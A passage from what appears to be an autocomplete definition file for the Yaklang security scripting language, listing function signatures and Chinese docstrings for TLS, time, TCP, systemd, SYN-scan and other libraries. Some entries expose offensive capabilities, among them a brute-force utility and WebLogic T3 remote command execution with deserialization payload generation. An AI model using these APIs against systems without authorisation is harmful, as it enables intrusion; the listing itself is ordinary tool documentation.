            functionName: "timeout(${1:timeout /*type: float64*/})",
            document: "",
            definitionStr:
              "timeout(timeout float64) pingutil.TracerouteConfigOption",
          },
          {
            functionName: "retry(${1:times /*type: int*/})",
            document: "",
            definitionStr: "retry(times int) TracerouteConfigOption",
          },
          {
            functionName: "protocol(${1:protocol /*type: string*/})",
            document: "",
            definitionStr: "protocol(protocol string) TracerouteConfigOption",
          },
          {
            functionName: "localIp(${1:addr /*type: string*/})",
            document: "",
            definitionStr: "localIp(addr string) TracerouteConfigOption",
          },
          {
            functionName: "hops(${1:hops /*type: int*/})",
            document: "",
            definitionStr: "hops(hops int) TracerouteConfigOption",
          },
          {
            functionName: "firstTTL(${1:ttl /*type: int*/})",
            document: "",
            definitionStr: "firstTTL(ttl int) TracerouteConfigOption",
          },
          {
            functionName: "ctx(${1:ctx /*type: context.Context*/})",
            document: "",
            definitionStr: "ctx(ctx context.Context) TracerouteConfigOption",
          },
          {
            functionName: "Diagnostic(${1:host /*type: string*/}, ${2:opts...})",
            document: "",
            definitionStr:
              "Diagnostic(host string, opts ...pingutil.TracerouteConfigOption) (chan *pingutil.TracerouteResponse, error)",
          },
        ],
      },
      {
        libName: "tools",
        prefix: "tools.",
        functions: [
          {
            functionName: "NewPocInvoker()",
            document: "",
            definitionStr: "NewPocInvoker() (*PocInvoker, error)",
          },
          {
            functionName: "NewBruteUtil(${1:t /*type: string*/})",
            document: "",
            definitionStr:
              "NewBruteUtil(t string) (*bruteutils.BruteUtil, error)",
          },
        ],
      },
      {
        libName: "tls",
        prefix: "tls.",
        functions: [
          {
            functionName:
              "SignX509ServerCertAndKey(${1:ca /*type: []byte*/}, ${2:key /*type: []byte*/})",
            document: "",
            definitionStr:
              'SignX509ServerCertAndKey(ca []byte, key []byte) (cert []byte, sKey []byte, _ error)  doc:SignX509ServerCertAndKey 根据给定的CA证书和私钥，生成服务器证书和密钥，返回PEM格式的服务器证书和密钥与错误\n\nExample:\n```\nca, key, err = tls.GenerateRootCA("yaklang.io")\ncert, sKey, err = tls.SignX509ServerCertAndKey(ca, key)\n```\n',
          },
          {
            functionName:
              "SignX509ClientCertAndKey(${1:ca /*type: []byte*/}, ${2:key /*type: []byte*/})",
            document: "",
            definitionStr:
              'SignX509ClientCertAndKey(ca []byte, key []byte) ([]byte, []byte, error)  doc:SignX509ClientCertAndKey 根据给定的CA证书和私钥，生成客户端证书和密钥，返回PEM格式的客户端证书和密钥与错误\n\nExample:\n```\nca, key, err = tls.GenerateRootCA("yaklang.io")\ncert, sKey, err = tls.SignX509ClientCertAndKey(ca, key)\n```\n',
          },
          {
            functionName:
              "SignServerCertAndKey(${1:ca /*type: []byte*/}, ${2:key /*type: []byte*/})",
            document: "",
            definitionStr:
              'SignServerCertAndKey(ca []byte, key []byte) (cert []byte, sKey []byte, _ error)  doc:SignServerCertAndKey 根据给定的CA证书和私钥，生成不包含认证的服务器证书和密钥，返回PEM格式的服务器证书和密钥与错误\n\nExample:\n```\nca, key, err = tls.GenerateRootCA("yaklang.io")\ncert, sKey, err = tls.SignServerCertAndKey(ca, key)\n```\n',
          },
          {
            functionName:
              "SignClientCertAndKey(${1:ca /*type: []byte*/}, ${2:key /*type: []byte*/})",
            document: "",
            definitionStr:
              'SignClientCertAndKey(ca []byte, key []byte) ([]byte, []byte, error)  doc:SignClientCertAndKey 根据给定的CA证书和私钥，生成不包含认证的客户端证书和密钥，返回PEM格式的客户端证书和密钥与错误\n\nExample:\n```\nca, key, err = tls.GenerateRootCA("yaklang.io")\ncert, sKey, err = tls.SignClientCertAndKey(ca, key)\n```\n',
          },
          {
            functionName: "InspectForceHttp2(${1:addr /*type: string*/})",
            document: "",
            definitionStr:
              'InspectForceHttp2(addr string) ([]*TLSInspectResult, error)  doc:InspectForceHttp2 检查目标地址的TLS证书，并返回其证书信息与错误，强制使用HTTP/2协议\n\nExample:\n```\ncert, err := tls.InspectForceHttp2("yaklang.io:443")\n```\n',
          },
          {
            functionName: "InspectForceHttp1_1(${1:addr /*type: string*/})",
            document: "",
            definitionStr:
              'InspectForceHttp1_1(addr string) ([]*TLSInspectResult, error)  doc:InspectForceHttp1_1 检查目标地址的TLS证书，并返回其证书信息与错误，强制使用HTTP/1.1协议\n\nExample:\n```\ncert, err := tls.InspectForceHttp1_1("yaklang.io:443")\n```\n',
          },
          {
            functionName: "Inspect(${1:addr /*type: string*/})",
            document: "",
            definitionStr:
              'Inspect(addr string) ([]*TLSInspectResult, error)  doc:Inspect 检查目标地址的TLS证书，并返回其证书信息与错误\n\nExample:\n```\ncert, err := tls.Inspect("yaklang.io:443")\n```\n',
          },
          {
            functionName: "GenerateSM2KeyPair()",
            document: "",
            definitionStr:
              "GenerateSM2KeyPair() ([]byte, []byte, error)  doc:GenerateSM2KeyPair 生成SM2公私钥对，返回PEM格式公钥和私钥与错误\n\nExample:\n```\npub, pri, err := tls.GenerateSM2KeyPair()\n```\n",
          },
          {
            functionName: "GenerateRootCA(${1:commonName /*type: string*/})",
            document: "",
            definitionStr:
              'GenerateRootCA(commonName string) (ca []byte, key []byte, err error)  doc:GenerateRootCA 根据名字生成根证书和私钥，返回PEM格式证书和私钥与错误\n\nExample:\n```\ncert, key, err := tls.GenerateRootCA("yaklang.io")\n```\n',
          },
          {
            functionName: "GenerateRSAKeyPair(${1:bitSize /*type: int*/})",
            document: "",
            definitionStr:
              "GenerateRSAKeyPair(bitSize int) ([]byte, []byte, error)  doc:GenerateRSAKeyPair 根据给定的bit大小生成RSA公私钥对，返回PEM格式公钥和私钥与错误\n\nExample:\n```\npub, pri, err := tls.GenerateRSAKeyPair(2048)\n```\n",
          },
          {
            functionName: "GenerateRSA4096KeyPair()",
            document: "",
            definitionStr:
              "GenerateRSA4096KeyPair() ([]byte, []byte, error)  doc:GenerateRSA4096KeyPair 生成4096位大小的RSA公私钥对，返回PEM格式公钥和私钥与错误\n\nExample:\n```\npub, pri, err := tls.GenerateRSA4096KeyPair()\n```\n",
          },
          {
            functionName: "GenerateRSA2048KeyPair()",
            document: "",
            definitionStr:
              "GenerateRSA2048KeyPair() ([]byte, []byte, error)  doc:GenerateRSA2048KeyPair 生成2048位大小的RSA公私钥对，返回PEM格式公钥和私钥与错误\n\nExample:\n```\npub, pri, err := tls.GenerateRSA2048KeyPair()\n```\n",
          },
          {
            functionName: "GenerateRSA1024KeyPair()",
            document: "",
            definitionStr:
              "GenerateRSA1024KeyPair() ([]byte, []byte, error)  doc:GenerateRSA1024KeyPair 生成1024位大小的RSA公私钥对，返回PEM格式公钥和私钥与错误\n\nExample:\n```\npub, pri, err := tls.GenerateRSA1024KeyPair()\n```\n",
          },
          {
            functionName:
              "EncryptWithPkcs1v15(${1:pemBytes /*type: []byte*/}, ${2:data})",
            document: "",
            definitionStr:
              'EncryptWithPkcs1v15(pemBytes []byte, data any) ([]byte, error)  doc:EncryptWithPkcs1v15 将PEM格式的公钥与数据进行PKCS1v15加密，返回密文与错误\n\nExample:\n```\nenc, err := tls.EncryptWithPkcs1v15(pemBytes, "hello")\n```\n',
          },
          {
            functionName:
              "DecryptWithPkcs1v15(${1:pemPriBytes /*type: []byte*/}, ${2:data})",
            document: "",
            definitionStr:
              "DecryptWithPkcs1v15(pemPriBytes []byte, data any) ([]byte, error)  doc:DecryptWithPkcs1v15 将PEM格式的私钥与密文进行PKCS1v15解密，返回明文与错误\n\nExample:\n```\ndec, err := tls.DecryptWithPkcs1v15(pemBytes, enc)\n```\n",
          },
        ],
      },
      {
        libName: "timezone",
        prefix: "timezone.",
        functions: [
          {
            functionName: "Now(${1:name /*type: string*/})",
            document: "",
            definitionStr:
              'Now(name string) time.Time  doc:Now 根据给定名称的时区返回当前时间结构体\n\nExample:\n```\nnow = timezone.Now("Asia/Shanghai")\n```\n',
          },
          {
            functionName: "Get(${1:name /*type: string*/})",
            document: "",
            definitionStr:
              'Get(name string) (*time.Location, error)  doc:Get 返回具有给定名称的时区与错误\n\n如果名称为空字符串 "" 或 "UTC"，LoadLocation 返回 UTC 时区\n\n如果名称为 "Local"，LoadLocation 返回本地时区\n\n否则，该名称被视为 IANA 时区数据库中的一个位置名称，如 "America/New_York"\n\nExample:\n```\nloc, err = timezone.Get("Asia/Shanghai")\n```\n',
          },
        ],
      },
      {
        libName: "time",
        prefix: "time.",
        functions: [
          {
            functionName: "sleep(${1:i /*type: float64*/})",
            document: "",
            definitionStr:
              "sleep(i float64)  doc:sleep 用于让当前协程休眠一段时间，其单位为秒\n\nExample:\n```\nsleep(1.5) // 休眠1.5秒\n```\n",
          },
          {
            functionName: "now()",
            document: "",
            definitionStr:
              'now() time.Time  doc:now 用于获取当前时间的时间结构体\n\n它实际是 time.Now 的别名\n\nExample:\n```\ndur = time.ParseDuration("1m")~\nctx, cancel = context.WithDeadline(context.New(), now().Add(dur))\n\nprintln(now().Format("2006-01-02 15:04:05"))\n```\n',
          },
          {
            functionName: "Until(${1:t /*type: time.Time*/})",
            document: "",
            definitionStr:
              "Until(t time.Time) time.Duration  doc:Until 函数返回当前时间到 t (未来时间)的时间间隔\n\nExample:\n```\nt = time.Unix(1704038400, 0) // 2024-1-1 00:00:00 +0800 CST\ntime.Until(t) // 返回当前时间到 t 的时间间隔\n```\n",
          },
          {
            functionName:
              "Unix(${1:sec /*type: int64*/}, ${2:nsec /*type: int64*/})",
            document: "",
            definitionStr:
              "Unix(sec int64, nsec int64) time.Time  doc:Unix 函数根据给定的 Unix 时间戳（从 1970 年 1 月 1 日 UTC 开始的 sec 秒和 nsec 纳秒）返回相应的本地时间结构体\n\nExample:\n```\ntime.Unix(1577808000, 0) // 2020-01-01 00:00:00 +0800 CST\n```\n",
          },
          {
            functionName: "Sleep(${1:i /*type: float64*/})",
            document: "",
            definitionStr:
              "Sleep(i float64)  doc:sleep 用于让当前协程休眠一段时间，其单位为秒\n\nExample:\n```\nsleep(1.5) // 休眠1.5秒\n```\n",
          },
          {
            functionName: "Since(${1:t /*type: time.Time*/})",
            document: "",
            definitionStr:
              "Since(t time.Time) time.Duration  doc:Since 函数返回自 t (过去时间)到当前时间的时间间隔\n\nExample:\n```\nt = time.Unix(1577808000, 0) // 2020-01-01 00:00:00 +0800 CST\ntime.Since(t) // 返回 t 到当前时间的时间间隔\n```\n",
          },
          {
            functionName: "ParseDuration(${1:s /*type: string*/})",
            document: "",
            definitionStr:
              'ParseDuration(s string) (time.Duration, error)  doc:ParseDuration 根据给定的格式解析时间间隔字符串，返回时间间隔结构体与错误\n\n时间间隔字符串是一个可能带有符号的十进制数字序列，每个数字可以带有可选的小数和单位后缀，例如 "300ms"，"-1.5h" 或 "2h45m"\n\n有效的时间单位有 "ns"（纳秒）, "us"（或 "µs" 微秒）, "ms"（毫秒）, "s"（秒）, "m"（分）, "h"（小时）\n\nExample:\n```\nd, err = time.ParseDuration("1h30m")\n```\n',
          },
          {
            functionName:
              "Parse(${1:layout /*type: string*/}, ${2:value /*type: string*/})",
            document: "",
            definitionStr:
              'Parse(layout string, value string) (time.Time, error)  doc:Parse 根据给定的格式解析时间字符串，返回时间结构体与错误\n\n一个参考的格式为：2006-01-02 15:04:05\n\nExample:\n```\nt, err = time.Parse("2006-01-02 15:04:05", "2020-01-01 00:00:00")\n```\n',
          },
          {
            functionName: "Now()",
            document: "",
            definitionStr:
              'Now() time.Time  doc:now 用于获取当前时间的时间结构体\n\nExample:\n```\ndur = time.ParseDuration("1m")~\nctx, cancel = context.WithDeadline(context.New(), now().Add(dur))\n\nprintln(now().Format("2006-01-02 15:04:05"))\n```\n',
          },
          {
            functionName: "NewTimer(${1:d /*type: float64*/})",
            document: "",
            definitionStr:
              "NewTimer(d float64) *time.Timer  doc:NewTimer 根据给定的时间间隔(单位：秒)返回一个定时器结构体引用\n\n你可以通过 <- timer.C 来等待定时器到期\n\n你也可以通过调用 timer.Stop 来取消定时器\n\nExample:\n```\ntimer = time.NewTimer(5) // 你可以通过调用 timer.Stop() 来取消定时器\n<-timer.C // 等待定时器到期\n```\n",
          },
          {
            functionName: "NewTicker(${1:d /*type: float64*/})",
            document: "",
            definitionStr:
              'NewTicker(d float64) *time.Ticker  doc:NewTicker 根据给定的时间间隔(单位：秒)返回一个循环定时器结构体引用，它会周期性的向返回的通道发送当前时间\n\n你可以通过 <- timer.C 来等待循环定时器到期\n\n你也可以通过调用 timer.Stop 来取消循环定时器\n\nExample:\n```\ntimer = time.NewTicker(5) // 你可以通过调用 timer.Stop() 来取消定时器\nticker = time.NewTicker(1)\nfor t in ticker.C {\nprintln("tick") // 每 1 秒打印一次 tick\n}\n```\n',
          },
          {
            functionName: "GetCurrentMonday()",
            document: "",
            definitionStr:
              "GetCurrentMonday() (time.Time, error)  doc:GetCurrentMonday 返回精确到本周星期一的时间结构体与错误\n\nExample:\n```\nmonday, err = time.GetCurrentMonday()\n```\n",
          },
          {
            functionName: "GetCurrentDate()",
            document: "",
            definitionStr:
              "GetCurrentDate() (time.Time, error)  doc:GetCurrentDate 返回精确到当前日期的时间结构体与错误\n\nExample:\n```\ndate, err = time.GetCurrentDate()\n```\n",
          },
          {
            functionName:
              "AfterFunc(${1:d /*type: time.Duration*/}, ${2:f /*type: func()*/})",
            document: "",
            definitionStr:
              'AfterFunc(d time.Duration, f func()) *time.Timer  doc:AfterFunc 用于创建一个定时器，它会在指定的时间后执行指定的函数，该函数会在另一个协程中执行\n\n该函数本身会立刻返回一个定时器结构体引用，你可以通过调用该引用的Stop方法来取消定时器\n\nExample:\n```\nd, err = time.ParseDuration("5s")\ntimer = time.AfterFunc(d, () => println("after 5s")) // 你可以通过调用 timer.Stop() 来取消定时器\ntime.sleep(10)\n```\n',
          },
          {
            functionName: "After(${1:d /*type: time.Duration*/})",
            document: "",
            definitionStr:
              'After(d time.Duration) <-chan time.Time  doc:After 用于创建一个定时器，它会在指定的时间后向返回的通道发送当前时间\n\nExample:\n```\nd, err = time.ParseDuration("5s")\n<-time.After(d) // 等待5秒后执行后续的语句\ntln("after 5s")\n```\n',
          },
        ],
      },
      {
        libName: "tcp",
        prefix: "tcp.",
        functions: [
          {
            functionName: "serverTls(${1:crt}, ${2:key}, ${3:cas...})",
            document: "",
            definitionStr:
              "serverTls(crt any, key any, cas ...any) TcpServerConfigOpt",
          },
          {
            functionName: "serverContext(${1:ctx /*type: context.Context*/})",
            document: "",
            definitionStr:
              "serverContext(ctx context.Context) TcpServerConfigOpt",
          },
          {
            functionName:
              "serverCallback(${1:cb /*type: func(connection *tcpConnection)*/})",
            document: "",
            definitionStr:
              "serverCallback(cb func(connection *tcpConnection)) TcpServerConfigOpt",
          },
          {
            functionName: "clientTls(${1:crt}, ${2:key}, ${3:caCerts...})",
            document: "",
            definitionStr:
              "clientTls(crt any, key any, caCerts ...any) dialerOpt",
          },
          {
            functionName: "clientTimeout(${1:i /*type: float64*/})",
            document: "",
            definitionStr: "clientTimeout(i float64) dialerOpt",
          },
          {
            functionName: "clientProxy(${1:proxy /*type: string*/})",
            document: "",
            definitionStr: "clientProxy(proxy string) dialerOpt",
          },
          {
            functionName: "clientLocal(${1:i})",
            document: "",
            definitionStr: "clientLocal(i any) dialerOpt",
          },
          {
            functionName:
              "Serve(${1:host}, ${2:port /*type: int*/}, ${3:opts...})",
            document: "",
            definitionStr:
              "Serve(host any, port int, opts ...TcpServerConfigOpt) error",
          },
          {
            functionName: "MockTCPProtocol(${1:name /*type: string*/})",
            document: "",
            definitionStr: "MockTCPProtocol(name string) (string, int)",
          },
          {
            functionName: "MockServe(${1:rsp /*type: []byte*/})",
            document: "",
            definitionStr: "MockServe(rsp []byte) (string, int)",
          },
          {
            functionName:
              "Forward(${1:localPort /*type: int*/}, ${2:remoteHost /*type: string*/}, ${3:remotePort /*type: int*/})",
            document: "",
            definitionStr:
              "Forward(localPort int, remoteHost string, remotePort int) error",
          },
          {
            functionName:
              "Connect(${1:host /*type: string*/}, ${2:port}, ${3:opts...})",
            document: "",
            definitionStr:
              "Connect(host string, port any, opts ...dialerOpt) (*tcpConnection, error)",
          },
        ],
      },
      {
        libName: "t3",
        prefix: "t3.",
        functions: [
          {
            functionName: "timeout(${1:duration /*type: float64*/})",
            document: "",
            definitionStr: "timeout(duration float64) OptionFun",
          },
          {
            functionName: "debugHandler(${1:handler /*type: func(string)*/})",
            document: "",
            definitionStr: "debugHandler(handler func(string)) OptionFun",
          },
          {
            functionName: "clearBackdoor(${1:clear /*type: bool*/})",
            document: "",
            definitionStr: "clearBackdoor(clear bool) OptionFun",
          },
          {
            functionName:
              "SendJavaObjectStreamBytes(${1:addr /*type: string*/}, ${2:acedBytes}, ${3:f...})",
            document: "",
            definitionStr:
              "SendJavaObjectStreamBytes(addr string, acedBytes any, f ...OptionFun) error",
          },
          {
            functionName:
              "GenerateWeblogicJNDIPayload(${1:addr /*type: string*/})",
            document: "",
            definitionStr: "GenerateWeblogicJNDIPayload(addr string) []byte",
          },
          {
            functionName:
              "GenerateJavaObjectStreamBytes(${1:cmd /*type: string*/})",
            document: "",
            definitionStr: "GenerateJavaObjectStreamBytes(cmd string) []byte",
          },
          {
            functionName:
              "ExecCommand(${1:addr /*type: string*/}, ${2:cmd /*type: string*/}, ${3:f...})",
            document: "",
            definitionStr:
              "ExecCommand(addr string, cmd string, f ...OptionFun) (string, error)",
          },
        ],
      },
      {
        libName: "systemd",
        prefix: "systemd.",
        functions: [
          {
            functionName: "unit_wants(${1:wants /*type: string*/})",
            document: "",
            definitionStr: "unit_wants(wants string) ConfigOption",
          },
          {
            functionName: "unit_requires(${1:requires /*type: string*/})",
            document: "",
            definitionStr: "unit_requires(requires string) ConfigOption",
          },
          {
            functionName: "unit_extra_line(${1:extraLine /*type: string*/})",
            document: "",
            definitionStr: "unit_extra_line(extraLine string) ConfigOption",
          },
          {
            functionName:
              "unit_documentation(${1:documentation /*type: string*/})",
            document: "",
            definitionStr:
              "unit_documentation(documentation string) ConfigOption",
          },
          {
            functionName: "unit_description(${1:description /*type: string*/})",
            document: "",
            definitionStr: "unit_description(description string) ConfigOption",
          },
          {
            functionName: "unit_binds_to(${1:bindsTo /*type: string*/})",
            document: "",
            definitionStr: "unit_binds_to(bindsTo string) ConfigOption",
          },
          {
            functionName: "unit_before(${1:before /*type: string*/})",
            document: "",
            definitionStr: "unit_before(before string) ConfigOption",
          },
          {
            functionName: "unit_after(${1:after /*type: string*/})",
            document: "",
            definitionStr: "unit_after(after string) ConfigOption",
          },
          {
            functionName: "timer_unit_inactive_sec(${1:s /*type: int64*/})",
            document: "",
            definitionStr: "timer_unit_inactive_sec(s int64) ConfigOption",
          },
          {
            functionName:
              "timer_unit_active_sec(${1:onUnitActiveSec /*type: int64*/})",
            document: "",
            definitionStr:
              "timer_unit_active_sec(onUnitActiveSec int64) ConfigOption",
          },
          {
            functionName: "timer_unit(${1:unit /*type: string*/})",
            document: "",
            definitionStr: "timer_unit(unit string) ConfigOption",
          },
          {
            functionName: "timer_startup_sec(${1:onStartupSec /*type: int64*/})",
            document: "",
            definitionStr: "timer_startup_sec(onStartupSec int64) ConfigOption",
          },
          {
            functionName: "timer_raw(${1:extraLine /*type: string*/})",
            document: "",
            definitionStr: "timer_raw(extraLine string) ConfigOption",
          },
          {
            functionName: "timer_calendar(${1:onCalendar /*type: string*/})",
            document: "",
            definitionStr: "timer_calendar(onCalendar string) ConfigOption",
          },
          {
            functionName: "timer_boot_sec(${1:onBootSec /*type: int64*/})",
            document: "",
            definitionStr: "timer_boot_sec(onBootSec int64) ConfigOption",
          },
          {
            functionName: "timer_active_sec(${1:onActiveSec /*type: int64*/})",
            document: "",
            definitionStr: "timer_active_sec(onActiveSec int64) ConfigOption",
          },
          {
            functionName: "service_user(${1:user /*type: string*/})",
            document: "",
            definitionStr: "service_user(user string) ConfigOption",
          },
          {
            functionName: "service_umask(${1:umask /*type: string*/})",
            document: "",
            definitionStr: "service_umask(umask string) ConfigOption",
          },
          {
            functionName: "service_type(${1:serviceType /*type: string*/})",
            document: "",
            definitionStr: "service_type(serviceType string) ConfigOption",
          },
          {
            functionName:
              "service_timeout_start_sec(${1:timeoutStartSec /*type: float64*/})",
            document: "",
            definitionStr:
              "service_timeout_start_sec(timeoutStartSec float64) ConfigOption",
          },
          {
            functionName: "service_stdout(${1:standardOutput /*type: string*/})",
            document: "",
            definitionStr: "service_stdout(standardOutput string) ConfigOption",
          },
          {
            functionName: "service_stdin(${1:standardInput /*type: string*/})",
            document: "",
            definitionStr: "service_stdin(standardInput string) ConfigOption",
          },
          {
            functionName: "service_stderr(${1:standardError /*type: string*/})",
            document: "",
            definitionStr: "service_stderr(standardError string) ConfigOption",
          },
          {
            functionName:
              "service_restart_sec(${1:restartSec /*type: float64*/})",
            document: "",
            definitionStr: "service_restart_sec(restartSec float64) ConfigOption",
          },
          {
            functionName: "service_restart(${1:restart /*type: string*/})",
            document: "",
            definitionStr: "service_restart(restart string) ConfigOption",
          },
          {
            functionName: "service_raw(${1:extraLine /*type: string*/})",
            document: "",
            definitionStr: "service_raw(extraLine string) ConfigOption",
          },
          {
            functionName: "service_kill_signal(${1:killSignal /*type: string*/})",
            document: "",
            definitionStr: "service_kill_signal(killSignal string) ConfigOption",
          },
          {
            functionName: "service_kill_mode(${1:killMode /*type: string*/})",
            document: "",
            definitionStr: "service_kill_mode(killMode string) ConfigOption",
          },
          {
            functionName: "service_kill9(${1:c /*type: *SystemdServiceConfig*/})",
            document: "",
            definitionStr: "service_kill9(c *SystemdServiceConfig) any",
          },
          {
            functionName: "service_group(${1:group /*type: string*/})",
            document: "",
            definitionStr: "service_group(group string) ConfigOption",
          },
          {
            functionName:
              "service_exec_stop_post(${1:execStopPost /*type: string*/})",
            document: "",
            definitionStr:
              "service_exec_stop_post(execStopPost string) ConfigOption",
          },
          {
            functionName: "service_exec_stop(${1:execStop /*type: string*/})",
            document: "",
            definitionStr: "service_exec_stop(execStop string) ConfigOption",
          },
          {
            functionName:
              "service_exec_start_pre(${1:execStartPre /*type: string*/})",
            document: "",
            definitionStr:
              "service_exec_start_pre(execStartPre string) ConfigOption",
          },
          {
            functionName:
              "service_exec_start_post(${1:execStartPost /*type: string*/})",
            document: "",
            definitionStr:
              "service_exec_start_post(execStartPost string) ConfigOption",
          },
          {
            functionName: "service_exec_start(${1:execStart /*type: string*/})",
            document: "",
            definitionStr: "service_exec_start(execStart string) ConfigOption",
          },
          {
            functionName:
              "service_environment_file(${1:environmentFile /*type: string*/})",
            document: "",
            definitionStr:
              "service_environment_file(environmentFile string) ConfigOption",
          },
          {
            functionName:
              "service_environment(${1:environment /*type: string*/})",
            document: "",
            definitionStr: "service_environment(environment string) ConfigOption",
          },
          {
            functionName: "install_wanted_by(${1:wantedBy /*type: string*/})",
            document: "",
            definitionStr: "install_wanted_by(wantedBy string) ConfigOption",
          },
          {
            functionName: "extra_raw(${1:i /*type: string*/})",
            document: "",
            definitionStr: "extra_raw(i string) ConfigOption",
          },
          {
            functionName: "Create(${1:name /*type: string*/}, ${2:opt...})",
            document: "",
            definitionStr:
              "Create(name string, opt ...ConfigOption) (string, string)",
          },
        ],
      },
      {
        libName: "synscan",
        prefix: "synscan.",
        functions: [
          {
            functionName: "wait(${1:sec /*type: float64*/})",
            document: "",
            definitionStr:
              'wait(sec float64) SynxConfigOption  doc:wait syn scan 的配置选项，设置等待扫描目标回包的最大时间\n\n@param {float64} sec 等待时间，单位秒\n\n@return {scanOpt} 返回配置选项\n\nExample:\n```\nres, err = synscan.Scan("127.0.0.1", "1-65535",\n\n\tsynscan.wait(5) // 等待 5 秒\n\n)\ndie(err)\n```\n',
          },
          {
            functionName:
              "submitTaskCallback(${1:callback /*type: func(i string)*/})",
            document: "",
            definitionStr:
              'submitTaskCallback(callback func(i string)) SynxConfigOption  doc:submitTaskCallback syn scan 的配置选项，设置一个回调函数，每提交一个探测数据包的时候，这个回调会执行一次\n\n@param {func(string)} i 回调函数\n\n@return {scanOpt} 返回配置选项\n\nExample:\n```\nres, err = synscan.Scan("127.0.0.1", "1-65535",\n\n\tsynscan.submitTaskCallback(func(i){\n\t   println(i) // 打印要探测的目标\n\t})\n\n)\ndie(err)\n```\n',
          },
          {
            functionName: "shuffle(${1:s /*type: bool*/})",
            document: "",
            definitionStr:
              'shuffle(s bool) SynxConfigOption  doc:shuffle syn scan 的配置选项，设置是否打乱扫描顺序\n\n@param {bool} s 是否打乱\n\n@return {scanOpt} 返回配置选项\n\nExample:\n```\nres, err = synscan.Scan("127.0.0.1", "1-65535",\n\n\tsynscan.shuffle(true) // 打乱扫描顺序\n\n)\ndie(err)\n```\n',
          },
          {
            functionName:
              "rateLimit(${1:ms /*type: int*/}, ${2:count /*type: int*/})",
            document: "",
            definitionStr:
              'rateLimit(ms int, count int) SynxConfigOption  doc:rateLimit syn scan 的配置选项，设置 syn 扫描的速率\n\n@param {int} ms 延迟多少毫秒\n\n@param {int} count 每隔多少个数据包延迟一次\n\n@return {scanOpt} 返回配置选项\n\nExample:\n```\nres, err = synscan.Scan("127.0.0.1", "1-65535",\n\n\tsynscan.rateLimit(1, 2000) // 每隔 2000 个数据包延迟 1 毫秒\n\n)\ndie(err)\n```\n',
          },
          {
            functionName: "outputPrefix(${1:prefix /*type: string*/})",
            document: "",
            definitionStr:
              'outputPrefix(prefix string) SynxConfigOption  doc:outputPrefix syn scan 的配置选项，设置本次扫描结果保存到文件时添加自定义前缀，比如 tcp:// https:// http:// 等，需要配合 outputFile 使用\n\n@param {string} prefix 前缀\n\n@return {scanOpt} 返回配置选项\n\nExample:\n```\nres, err = synscan.Scan("127.0.0.1", "1-65535",\n\n\t synscan.outputFile("./open_ports.txt"),\n\t\tsynscan.outputPrefix("tcp://")\n\n)\ndie(err)\n```\n',
          },
          {
            functionName: "outputFile(${1:file /*type: string*/})",
            document: "",
            definitionStr:
              'outputFile(file string) SynxConfigOption  doc:outputFile syn scan 的配置选项，设置本次扫描结果保存到指定的文件\n\n@param {string} file 文件路径\n\n@return {scanOpt} 返回配置选项\n\nExample:\n```\nres, err = synscan.Scan("127.0.0.1", "1-65535",\n\n\tsynscan.outputFile("/tmp/open_ports.txt")\n\n)\ndie(err)\n```\n',
          },
          {
            functionName: "maxPorts(${1:max /*type: int*/})",
            document: "",
            definitionStr:
              'maxPorts(max int) SynxConfigOption  doc:maxOpenPorts syn scan 的配置选项，设置单个 IP 允许的最大开放端口数\n\n@param {int} max 最大开放端口数\n\n@return {scanOpt} 返回配置选项\n\nExample:\n```\nres, err = synscan.Scan("127.0.0.1", "1-65535",\n\n\tsynscan.maxOpenPorts(100) // 单个 IP 最多开放 100 个端口\n\n)\ndie(err)\n```\n',
          },
          {
            functionName: "initPortFilter(${1:ports /*type: string*/})",
            document: "",
            definitionStr:
              'initPortFilter(ports string) SynxConfigOption  doc:initPortFilter syn scan 的配置选项，设置本次扫描的端口过滤器，只展示这些端口的扫描结果\n\n@param {string} f 端口，支持逗号、-分割\n\n@return {scanOpt} 返回配置选项\n\nExample:\n```\nres, err = synscan.Scan("192.168.3.1", "1-65535",\n\n\tsynscan.initPortFilter("1-100,200-300")\n\n)\ndie(err)\n```\n',
          },
          {
            functionName: "initHostFilter(${1:hosts /*type: string*/})",
            document: "",
            definitionStr:
              'initHostFilter(hosts string) SynxConfigOption  doc:initHostFilter syn scan 的配置选项，设置本次扫描的主机过滤器，只展示这些主机的扫描结果\n\n@param {string} f 主机，支持逗号、CIDR、-分割\n\n@return {scanOpt} 返回配置选项\n\nExample:\n```\nres, err = synscan.Scan("192.168.1.1/24", "1-65535",\n\n\tsynscan.initHostFilter("192.168.1.1,192.168.1.2")\n\n)\ndie(err)\n```\n',
          },
          {
            functionName: "iface(${1:iface /*type: string*/})",
            document: "",
            definitionStr:
              'iface(iface string) SynxConfigOption  doc:iface syn scan 的配置选项，设置 syn 扫描的网卡\n\n@param {string} iface 网卡名称\n\n@return {scanOpt} 返回配置选项\n\nExample:\n```\nres, err = synscan.Scan("192.168.1.1/24", "1-65535",\n\n\tsynscan.iface("eth0") // 使用 eth0 网卡\n\n)\ndie(err)\n```\n',
          },
          {
            functionName: "excludePorts(${1:ports /*type: string*/})",
            document: "",
            definitionStr:
              'excludePorts(ports string) SynxConfigOption  doc:excludePorts syn scan 的配置选项，设置本次扫描排除的端口\n\n@param {string} ports 端口，支持 1-65535、1,2,3、1-100,200-300 格式\n\n@return {scanOpt} 返回配置选项\n\nExample:\n```\nres, err = synscan.Scan("127.0.0.1", "1-65535",\n\n\tsynscan.excludePorts("1-100,200-300") // 排除 1-100 和 200-300 端口\n\n)\ndie(err)\n```\n',
          },
          {
            functionName: "excludeHosts(${1:hosts /*type: string*/})",
            document: "",
            definitionStr:
              'excludeHosts(hosts string) SynxConfigOption  doc:excludeHosts syn scan 的配置选项，设置本次扫描排除的主机\n\n@param {string} hosts 主机，支持逗号分割、CIDR、-的格式\n\n@return {scanOpt} 返回配置选项\n\nExample:\n```\nres, err = synscan.Scan("192.168.1.1/24", "1-65535",\n\n\tsynscan.excludeHosts("192.168.1.1,192.168.1.3-10,192.168.1.1/26")\n\n)\ndie(err)\n```\n',
          },
          {
            functionName: "concurrent(${1:count /*type: int*/})",
            document: "",
            definitionStr:
              'concurrent(count int) SynxConfigOption  doc:concurrent syn scan 的配置选项，设置 syn 扫描的发包速率，和 rateLimit 基本相同\n\n@param {int} count 并发数\n\n@return {scanOpt} 返回配置选项\n\nExample:\n```\nres, err = synscan.Scan("127.0.0.1", "1-65535",\n\n\tsynscan.concurrent(1000) // 并发 1000\n\n)\ndie(err)\n```\n',
          },
          {
            functionName:
              "callback(${1:callback /*type: func(result *synscan.SynScanResult)*/})",
            document: "",
            definitionStr:
